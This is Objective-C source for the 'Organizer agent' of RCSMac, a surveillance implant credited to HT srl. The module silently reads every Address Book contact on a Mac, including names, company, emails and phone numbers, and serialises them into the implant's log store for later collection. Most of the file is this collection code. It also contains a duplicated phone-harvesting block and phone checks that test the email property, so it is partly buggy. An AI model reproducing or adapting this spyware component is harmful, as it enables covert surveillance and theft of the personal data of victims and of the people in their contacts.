/*
 * RCSMac - Organizer agent
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 26/11/2010
 * Copyright (C) HT srl 2010. All rights reserved
 *
 */

#import <AddressBook/AddressBook.h>
#import "RCSMAgentOrganizer.h"

//#define DEBUG

static RCSMAgentOrganizer *sharedAgentOrganizer = nil;


@interface RCSMAgentOrganizer (private)

//
// Grab all contacts available on AB
//
- (void)_grabAllContacts;

//
// Grab a single contact - observer for kABDatabaseChangedExternallyNotification
//
- (void)_grabSingleContact: (NSNotification *)aNotification;

//
// Serialize the object for logging
//
- (NSData *)_prepareContactForLogging: (ABRecord *)aRecord;

- (NSData *)_serializeSingleRecordData: (NSData *)aRecordData
                              withType: (int32_t)aType
                               outSize: (int32_t *)outSize;

//
// Write down the log data
// Can be a single contact or a list
//
- (BOOL)_logData: (NSMutableData *)aLogData;

@end

@implementation RCSMAgentOrganizer (private)

- (void)_grabAllContacts
{
#ifdef DEBUG
  infoLog(ME, @"");
#endif
  
  ABAddressBook *addressBook = [ABAddressBook sharedAddressBook];
  NSArray *allPeople = [addressBook people];
  
  NSMutableData *logData = [NSMutableData new];
  
  for (ABRecord *record in allPeople)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      NSData *contactLog = [self _prepareContactForLogging: record];
      [logData appendData: contactLog];
      [contactLog release];
      
      [innerPool release];
    }
  
  [self _logData: logData];
  [logData release];
}

- (void)_grabSingleContact: (NSNotification *)aNotification
{
  
}

- (NSData *)_prepareContactForLogging: (ABRecord *)aRecord
{
#ifdef DEBUG
  infoLog(ME, @"");
#endif
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  NSMutableData *logHeader = [[NSMutableData alloc]
                              initWithLength: sizeof(organizerAdditionalHeader)];
  NSMutableData *contactLog = [NSMutableData new];
  organizerAdditionalHeader *additionalHeader = (organizerAdditionalHeader *)[logHeader bytes];;
  
  // First Name
  if ([aRecord valueForProperty: kABFirstNameProperty])
    {
      NSString *firstNameValue = [aRecord valueForProperty: kABFirstNameProperty];
      NSData *recordData = [firstNameValue dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
      int32_t blockSize = 0;
      
      NSData *serializedData = [self _serializeSingleRecordData: recordData
                                                       withType: FirstName
                                                        outSize: &blockSize];
      [serializedData retain];
      
#ifdef DEBUG
      NSLog(@"blockSize: %d", blockSize);
#endif
      
      additionalHeader->size        = blockSize;
      additionalHeader->version     = CONTACT_LOG_VERSION;
      additionalHeader->identifier  = 0;
    
      // Generate the log NSData within the header
      [contactLog appendData: logHeader];
      [contactLog appendData: serializedData];
                            
      [serializedData release];
    }
  
  // Last Name
  if ([aRecord valueForProperty: kABLastNameProperty])
    {
      u_int elemSize = [[aRecord valueForProperty: kABLastNameProperty]
                        lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      NSMutableData *singleElement = [NSMutableData new];
      
      //
      // This should be tag-1b -- len-3b (1dword)
      //
      u_int tag = LastName << 24;
      tag |= elemSize;
      
      u_int blockSize = sizeof(organizerAdditionalHeader)
                        + sizeof(u_int)
                        + elemSize;
      
      additionalHeader->size        = blockSize;
      additionalHeader->version     = CONTACT_LOG_VERSION;
      additionalHeader->identifier  = 0;
      
      [singleElement appendBytes: &tag
                          length: sizeof(u_int)];
      [singleElement appendData: [[aRecord valueForProperty: kABLastNameProperty]
                                  dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
      
      // Generate the log NSData within the header
      [contactLog appendData: logHeader];
      [contactLog appendData: singleElement];
      
      [singleElement release];
    }
  
  // Company Name
  if ([aRecord valueForProperty: kABOrganizationProperty])
    {
      u_int elemSize = [[aRecord valueForProperty: kABOrganizationProperty]
                        lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      NSMutableData *singleElement = [NSMutableData new];
      
      //
      // This should be tag-1b -- len-3b (1dword)
      //
      u_int tag = CompanyName << 24;
      tag |= elemSize;
      
      u_int blockSize = sizeof(organizerAdditionalHeader)
                        + sizeof(u_int)
                        + elemSize;
      
      additionalHeader->size        = blockSize;
      additionalHeader->version     = CONTACT_LOG_VERSION;
      additionalHeader->identifier  = 0;
      
      [singleElement appendBytes: &tag
                          length: sizeof(u_int)];
      [singleElement appendData: [[aRecord valueForProperty: kABOrganizationProperty]
                                  dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
      
      // Generate the log NSData within the header
      [contactLog appendData: logHeader];
      [contactLog appendData: singleElement];
      
      [singleElement release];
    }
  
  // Email Address
  // MultiValue
  if ([aRecord valueForProperty: kABEmailProperty])
    {
      ABMultiValue *email = [aRecord valueForProperty: kABEmailProperty];
      int i = 0;
      
      //
      // Grab at max 3 email addresses
      //
      if ([email count] <= 3)
        {
          for (; i < [email count]; i++)
            {
              u_int elemSize = [[email valueAtIndex: i]
                                lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
              NSMutableData *singleElement = [NSMutableData new];
              
              //
              // This should be [tag-1b -- len-3b] (1 dword)
              //
              u_int tag = 0;
              
              switch (i)
                {
                case 0:
                  tag = Email1Address << 24;
                  break;
                case 1:
                  tag = Email2Address << 24;
                  break;
                case 2:
                  tag = Email3Address << 24;
                  break;
                }
              
              tag |= elemSize;
              
              u_int blockSize = sizeof(organizerAdditionalHeader)
                                + sizeof(u_int)
                                + elemSize;
              
              additionalHeader->size        = blockSize;
              additionalHeader->version     = CONTACT_LOG_VERSION;
              additionalHeader->identifier  = 0;
              
              [singleElement appendBytes: &tag
                                  length: sizeof(u_int)];
              [singleElement appendData: [[email valueAtIndex: i]
                                          dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
              
              // Generate the log NSData within the header
              [contactLog appendData: logHeader];
              [contactLog appendData: singleElement];
              
              [singleElement release];
            }
        }
      else // Grab at least one
        {
          u_int elemSize = [[email valueAtIndex: 0]
                            lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
          NSMutableData *singleElement = [NSMutableData new];
          
          //
          // This should be [tag-1b -- len-3b] (1 dword)
          //
          u_int tag = 0;
          
          tag = Email1Address << 24;
          tag |= elemSize;
          
          u_int blockSize = sizeof(organizerAdditionalHeader)
                            + sizeof(u_int)
                            + elemSize;
          
          additionalHeader->size        = blockSize;
          additionalHeader->version     = CONTACT_LOG_VERSION;
          additionalHeader->identifier  = 0;
          
          [singleElement appendBytes: &tag
                              length: sizeof(u_int)];
          [singleElement appendData: [[email valueAtIndex: 0]
                                      dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
          
          // Generate the log NSData within the header
          [contactLog appendData: logHeader];
          [contactLog appendData: singleElement];
          
          [singleElement release];
        }
    }
  
  // Phone
  // MultiValue
  if ([aRecord valueForProperty: kABEmailProperty])
    {
      ABMultiValue *phone = [aRecord valueForProperty: kABPhoneProperty];
      int i = 0;
      
      //
      // Grab at max 3 phone numbers
      //
      if ([phone count] <= 3)
        {
          for (; i < [phone count]; i++)
            {
              u_int elemSize = [[phone valueAtIndex: i]
                                lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
              NSMutableData *singleElement = [NSMutableData new];
              
              //
              // This should be [tag-1b -- len-3b] (1 dword)
              //
              u_int tag = 0;
              
              if ([[phone labelAtIndex: i] isEqualToString: kABPhoneMobileLabel])
                {
                  tag = MobileTelephoneNumber << 24;
                }
              else if ([[phone labelAtIndex: i] isEqualToString: kABPhoneWorkLabel])
                {
                  tag = BusinessTelephoneNumber << 24;
                }
              else if ([[phone labelAtIndex: i] isEqualToString: kABPhoneHomeLabel])
                {
                  tag = HomeTelephoneNumber << 24;
                }
              
              tag |= elemSize;
              
              u_int blockSize = sizeof(organizerAdditionalHeader)
                                + sizeof(u_int)
                                + elemSize;
              
              additionalHeader->size        = blockSize;
              additionalHeader->version     = CONTACT_LOG_VERSION;
              additionalHeader->identifier  = 0;
              
              [singleElement appendBytes: &tag
                                  length: sizeof(u_int)];
              [singleElement appendData: [[phone valueAtIndex: i]
                                          dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
              
              // Generate the log NSData within the header
              [contactLog appendData: logHeader];
              [contactLog appendData: singleElement];
              
              [singleElement release];
            }
        }
      else // Grab at least one
        {
          u_int elemSize = [[phone valueAtIndex: 0]
                            lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
          NSMutableData *singleElement = [NSMutableData new];
          
          //
          // This should be [tag-1b -- len-3b] (1 dword)
          //
          u_int tag = 0;
          
          tag = MobileTelephoneNumber << 24;
          tag |= elemSize;
          
          u_int blockSize = sizeof(organizerAdditionalHeader)
                            + sizeof(u_int)
                            + elemSize;
          
          additionalHeader->size        = blockSize;
          additionalHeader->version     = CONTACT_LOG_VERSION;
          additionalHeader->identifier  = 0;
          
          [singleElement appendBytes: &tag
                              length: sizeof(u_int)];
          [singleElement appendData: [[phone valueAtIndex: 0]
                                      dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
          
          // Generate the log NSData within the header
          [contactLog appendData: logHeader];
          [contactLog appendData: singleElement];
          
          [singleElement release];
        }
    }
  
  // Phone
  // MultiValue
  if ([aRecord valueForProperty: kABEmailProperty])
    {
      ABMultiValue *phone = [aRecord valueForProperty: kABPhoneProperty];
      int i = 0;
      
      //
      // Grab at max 3 phone numbers
      //
      if ([phone count] <= 3)
        {
        for (; i < [phone count]; i++)
          {
          u_int elemSize = [[phone valueAtIndex: i]
                            lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
          NSMutableData *singleElement = [NSMutableData new];
          
          //
          // This should be [tag-1b -- len-3b] (1 dword)
          //
          u_int tag = 0;
          
          if ([[phone labelAtIndex: i] isEqualToString: kABPhoneMobileLabel])
            {
            tag = MobileTelephoneNumber << 24;
            }
          else if ([[phone labelAtIndex: i] isEqualToString: kABPhoneWorkLabel])
            {
            tag = BusinessTelephoneNumber << 24;
            }
          else if ([[phone labelAtIndex: i] isEqualToString: kABPhoneHomeLabel])
            {
            tag = HomeTelephoneNumber << 24;
            }
          
          tag |= elemSize;
          
          u_int blockSize = sizeof(organizerAdditionalHeader)
          + sizeof(u_int)
          + elemSize;
          
          additionalHeader->size        = blockSize;
          additionalHeader->version     = CONTACT_LOG_VERSION;
          additionalHeader->identifier  = 0;
          
          [singleElement appendBytes: &tag
                              length: sizeof(u_int)];
          [singleElement appendData: [[phone valueAtIndex: i]
                                      dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
          
          // Generate the log NSData within the header
          [contactLog appendData: logHeader];
          [contactLog appendData: singleElement];
          
          [singleElement release];
        }
      }
    else // Grab at least one
      {
      u_int elemSize = [[phone valueAtIndex: 0]
                        lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      NSMutableData *singleElement = [NSMutableData new];
      
      //
      // This should be [tag-1b -- len-3b] (1 dword)
      //
      u_int tag = 0;
      
      tag = MobileTelephoneNumber << 24;
      tag |= elemSize;
      
      u_int blockSize = sizeof(organizerAdditionalHeader)
      + sizeof(u_int)
      + elemSize;
      
      additionalHeader->size        = blockSize;
      additionalHeader->version     = CONTACT_LOG_VERSION;
      additionalHeader->identifier  = 0;
      
      [singleElement appendBytes: &tag
                          length: sizeof(u_int)];
      [singleElement appendData: [[phone valueAtIndex: 0]
                                  dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
      
      // Generate the log NSData within the header
      [contactLog appendData: logHeader];
      [contactLog appendData: singleElement];
      
      [singleElement release];
      }
    }
  
  [logHeader release];
  [outerPool release];
  
  return contactLog;
}

- (NSData *)_serializeSingleRecordData: (NSData *)aRecordData
                              withType: (int32_t)aType
                               outSize: (int32_t *)outSize
{
  u_int elemSize = [aRecordData length];
  NSMutableData *singleElement = [NSMutableData new];
  
  //
  // This should be tag-1b -- len-3b (1dword)
  //
  u_int tag = aType << 24;
  tag |= elemSize;
  
  u_int blockSize = sizeof(organizerAdditionalHeader)
                    + sizeof(u_int)
                    + elemSize;
  
  *outSize = blockSize;
  
  [singleElement appendBytes: &tag
                      length: sizeof(u_int)];
  [singleElement appendData: aRecordData];
  
  return singleElement;
}

- (BOOL)_logData: (NSMutableData *)aLogData
{
#ifdef DEBUG
  infoLog(ME, @"");
#endif
  
  RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
  
  if ([logManager createLog: AGENT_ORGANIZER
                agentHeader: nil
                  withLogID: 0] == FALSE)
    {
#ifdef DEBUG
      errorLog(ME, @"An error occurred while creating log");
#endif
      
      return FALSE;
    }
  
  if ([logManager writeDataToLog: aLogData
                        forAgent: AGENT_ORGANIZER
                       withLogID: 0] == FALSE)
      {
#ifdef DEBUG
        errorLog(ME, @"An error occurred while writing data");
#endif
        
        return FALSE;
      }

  [logManager closeActiveLog: AGENT_ORGANIZER
                   withLogID: 0];
  
  return YES;
}

@end


@implementation RCSMAgentOrganizer

//@synthesize mConfiguration;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSMAgentOrganizer *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentOrganizer == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedAgentOrganizer;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentOrganizer == nil)
      {
        sharedAgentOrganizer = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedAgentOrganizer;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

#ifdef DEBUG
  NSLog(@"Agent organizer started");
  NSLog(@"AgentConf: %@", mConfiguration);
#endif
  
  [mConfiguration setObject: AGENT_RUNNING
                     forKey: @"status"];
  
  //
  // First off, grab all contacts
  //
  [self _grabAllContacts];
  
  //
  // Now register our observer in order to grab notifications about changes
  //
  /*[[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self
                                                         selector: @selector(_grabSingleContact:)
                                                             name: kABDatabaseChangedExternallyNotification 
                                                           object: nil];
  */
  while ([mConfiguration objectForKey: @"status"]    != AGENT_STOP
         && [mConfiguration objectForKey: @"status"] != AGENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      // File sequenziale
      // per default all'inizio prende tutto e poi logga ogni qualvolta un nuovo
      // contatto viene aggiunto oppure ogni n secs in assenza di un meccanismo
      // di notifica
      
      [innerPool release];
      sleep(1);
    }
  
#ifdef DEBUG
  warnLog(ME, @"STOPPING");
#endif
  
  if ([mConfiguration objectForKey: @"status"] == AGENT_STOP)
    {
      [mConfiguration setObject: AGENT_STOPPED
                         forKey: @"status"];
    }
  
  [outerPool release]; 
}

- (BOOL)stop
{
#ifdef DEBUG
  warnLog(ME, @"");
#endif
  int internalCounter = 0;
  
  [mConfiguration setObject: AGENT_STOP
                     forKey: @"status"];
  
#ifdef DEBUG
  warnLog(ME, @"Configuration set to STOP, now waiting");
#endif
  
  while ([mConfiguration objectForKey: @"status"] != AGENT_STOPPED
         && internalCounter <= MAX_STOP_WAIT_TIME)
    {
      internalCounter++;
      sleep(1);
    }
  
#ifdef DEBUG
  warnLog(ME, @"STOPPED");
#endif

  return YES;
}

- (BOOL)resume
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
  if (aConfiguration != mConfiguration)
    {
      [mConfiguration release];
      mConfiguration = [aConfiguration retain];
    }
}

- (NSMutableDictionary *)mConfiguration
{
  return mConfiguration;
}


@end